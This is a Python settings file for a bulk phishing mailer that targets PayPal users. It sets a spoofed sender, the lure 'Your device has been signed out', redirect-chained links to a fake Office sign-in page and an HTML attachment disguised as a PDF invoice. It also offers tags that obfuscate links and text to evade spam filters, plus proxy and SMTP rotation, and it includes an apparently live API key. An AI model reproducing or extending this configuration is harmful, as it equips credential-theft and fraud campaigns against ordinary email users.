from typing import Generator

from enums import Contact, Attachment

debug = False  # Log development logs
timezone = "America/New_York"
spam_target = 'paypal.com'

proxy_configuration = {
    'enabled': False,
    'file_path': 'proxy_list.txt',
    'default_protocol': 'socks5',  # http, socks4, socks5
    'rotate_list': True,  # Rotate over proxies in the list
}

letter = 'letter/simple_greeting.html'
content_encoding = 'base64'  # Available Options: 'base64', '7bit', '8bit', 'binary', 'quoted-printable'
plain_message_content = """Hello #email_id#
Please allow html output or use different mailbox with html support."""  # DISABLED

raw_letter = {
    'enabled': False,
    'file_path': 'letter/raw_letters/letter.eml',
    'use_subject': True  # True => use subject in the raw file, False => use subjects in this config file
}

receivers_csv = {
    'file_path': 'receivers/list.csv',
    'name_format': '#email_id#',  # You can use tags like: #email_id# for James Bond or #receiver_id# for James.bond for James.bond@domain.com

    # Available values (Contact.*): EMAIL, FIRST_NAME, LAST_NAME, ADDRESS, PHONE_NUMBER, BIRTH_DATE
    'column_titles': [Contact.EMAIL, Contact.FIRST_NAME, Contact.LAST_NAME, Contact.ADDRESS],
}

multi_thread_settings = {
    'max_workers': 10,  # maximum number of parallel threads
    'timeout': 20,  # cancel the thread if didn't finish its job before the timeout (in seconds)
    'use_asyncio': False,
}

mailchannels = {
    'worker_url': 'https://mailchannel.realsamy.workers.dev/',
    'sender_name': 'James Bond',
    'sender_address': 'news@chemicloud.com',
}

smtp_configuration = {
    'file_path': 'smtp/list.csv',
    'sender_name': '',
    'rotate_smtp': False,  # Rotate over smtp list
    'hide_sender': False,  # it hides the sender email but marks message as junk! don't use yet!
    'starttls': True,  # Use starttls protocol
    'connection_recycle_limit': 0,  # How many times the same connection will be used before creating new one
}

# smtp_fallback_configuration = {
#     'host': 'smtp-mail.outlook.com',
#     'port': 587,
#     'user': 'youruser@outlook.com',
#     'pass': 'yourpassword',
#
#     'sender_name': 'James Bond',
#     'sender_email': 'youruser@outlook.com',
# }

# Configure options for PDF generation (optional)
html_to_pdf_options = {
    'enabled': False,
    'file_path': 'letter/pdf_error.html',
    'file_name': '#date# summary_report #email_id#.pdf',
    'encrypt': True,
    'password': '#NUM-4#',
    'generator_settings': {
        'page-size': 'A4',
        'margin-top': '0mm',
        'margin-right': '0mm',
        'margin-bottom': '0mm',
        'margin-left': '0mm',
        'enable-local-file-access': '',
    },
}

html_to_image_options = {
    'enabled': False,
    'inline': True,
    'file_path': 'letter/new_m.html',
    'generator_settings': {
        'format': 'png',
        'width': '700',  # Width of the viewport in pixels
        # 'height': '0',  # Height of the viewport in pixels, '0' means auto-adjust to content height
        # 'crop-w': '800',  # Width of the output image in pixels
        # 'crop-h': '0',  # Height of the output image in pixels, '0' means auto-adjust to content height
    }
}

icalendar_options = {
    'enabled': False,
    'file_path': 'letter/new_m.html',
}

extra_attachments = {
    'enabled': False,
    'list': [
        Attachment.File(
            file_path='letter/new_m.html',
            file_name='test invoice #email#.pdf.htm',
            mime_type='application/pdf',
        ),
    ]
}

text_to_image = {
    'inline': False,
    'font_path': 'fonts/SegoeUI/segoeui.ttf',
}

headers_settings = {
    'enabled': False,
    'organization': False,
    'unsubscribe': True,

    'Thread': False,
    'Thread-Topic': 'Your device has been signed out',
    'Thread-Index': 'AQHan//eOd8hdNsqyEGz7pI3ewyjErGKwAgwgBD8BJA=',

    # 'mode': None,  # cc or bcc or None to disable | NOT IMPLEMENTED YET
    # todo: ... other header settings soon!
}

# user_agent_rotate = False  | NOT IMPLEMENTED YET

subjects = [
    'Re:'
]
subject_encode = True

shorts_settings = {
    'api_key': '3046fab31025ad211b63de2ad11d6faba4904',
    'use_shortener': False,
    'rotate': False,
    'list': [
        'https://api-rmessage.readyplanet.com/v1/public/link/tracking/2533b6e8b6a17f21c955e1e6248e6f63/10/a1d90c584f79fbac787cd5ec160855cc?url=https://trc.dwhab.com?(#LET-MIX-26##base64#[u.iebsdatabase.com/accounts/signin/office/])',
    ]
}

local_images = {
    'inline': True,
}
unicode_qr_settings = {
    'font_size': '3.75px',
    'foreground_color': 'black',
    'background_color': 'transparent',
}


qr_settings = {
    'inline': True,
    'logo_path': '',
}

headers = [
    # '',
]

sign_dkim = {
    'enabled': False,
    'selector': 'selector1',
    'private_key': 'cert/DKIM/private.key',
}

"""
/* ────────────- TAG OBFUSCATE AND INSERT IMAGE ───────────────────────────
| #html2image#    = Create image from html letter and insert to tag's src |
| <zero>		  = generate readable word with fontsize 0			      |
| <obf>anything word letter</obf>        = obfuscate string			      |
| <obflink>https://your.com</obflink> 	 = obfuscate link			      |
/* ───────────────────────────────────────────────────────────────────────*

/* ──────────────────- FUNCTION T A G  AVAILABLE ───────────────────────────
#encrypted_short#[domain.ext] = encrypted random scam link after the domain, insert domain without http(s)://
#encode#[string]              = Encrypt string
#base64#[string]              = Base64 encode string
#hide_dash#[Shy text]         = Shy text
#pdf_password#                = Generated PDF password
#tti-xx#[string]              = Text to image generate, xx is font size
#local_image#[file_path]      = Attach image to html body


/* ───────────────────- QRCODE T A G  AVAILABLE ────────────────────────────
#qrcode#                      = Put QR code in img src tag
#unicode_qrcode#              = Put unicode QR code in html


/* ───────────────────- RANDOM T A G  AVAILABLE ────────────────────────────
#email#                       = email target from list or CSV
#email_id#                    = from email to name [james.bond@domain.com => James Bond]
#email_base64#                = base64 email
#receiver_id#                 = from email to id [james.bond@domain.com => james.bond]
#csv_firstname#               = take Firstname From CSV
#csv_lastname#                = take LastName From CSV
#csv_address#                 = take address From CSV
#csv_birth#                   = take Date Of Birth From CSV
#csv_phone#                   = take Phone Number from CSV
#company#                     = take company from target email
#domain_local#                = generate random domain using real words
#domain_receiver#             = take Domain name from target Leads when SendMail
#domain_smtp#,                = domain from SMTP Sender
#NUM-XX#                      = generate NUMBER with total X
#LET-LOW-XX#                  = generate LETTER lowercase with total X
#LET-UP-XX#                   = generate LETTER Uppercase with total X
#LET-MIX-XX#                  = generate Mix lowercase and uppercase Letter with total X
#NUM-XX#                      = generate NUMBER with total X
#LETNUM-(LOW|UP|MIX)-XX#      = generate mix of letters and numbers with same conditions
#dolar#                       = Generate dolar value
#dolar_ca#                    = Generate dolar Canada value
#euro#                        = Generate Euro value
#jpy#                         = Generate Japan Yen Value
#fake_text#                   = Generate real text
#fake_email#                  = Generate Fake Email address
#cash_tag#                    = Generate random $randomName tag
#us_name#                     = Generate US fake name
#us_address#                  = Generate fake us address
#us_phone#                    = Generate Fake USphone number
#ca_name#                     = Generate CA fake name
#ca_address#                  = Generate fake CA address
#ca_phone#                    = Generate Fake CA phone number
#fr_name#                     = Generate France fake name
#fr_address#                  = Generate France address
#fr_phone#                    = Generate France phone number
#de_name#                     = Generate Germany fake name
#de_address#                  = Generate Germany Address
#de_phone#                    = Generate Germany phone number
#jp_name#                     = Generate Japan Fake name
#jp_address#                  = Generate Japan Address
#jp_phone#                    = Generate Japan Phone number
#giftcode#                    = 16 random number letter Uppercase
#letter_up#                   = Uppercase random string count 4-8
#letter_low#                  = Lowercase random string count 4-8
#letter_mix#                  = Mix-case random string count 4-8
#letter_number#               = random string & number count 14-16
#letter_number_up#            = Uppercase random string & number count 10-12
#letter_number_mix#           = Mix-case random string & number count 10-12
#country#                     = Random country
#date#                        = Random date
#old_date#                    = Random date 1-3 day ago
#os#                          = Random OS
#browser#                     = Random Browser
#number#                      = Random Number
#ip#                          = Random IP
#user_agent_mac#              = random UserAgent
#user_agents_windows#         = random UserAgent
#short#                       = random scam link
#lipsum#                      = generate lorem ipsum


/*────────────────────────────────────────────────────────────────
#target_username#             = use this in smtp from address to replace with receiver's username
/*────────────[***************************]────────────────────**/
"""

# These codes are just placeholders for runtime definitions, do not change!
get_smtp_configuration: Generator
get_proxy: Generator
get_short: Generator
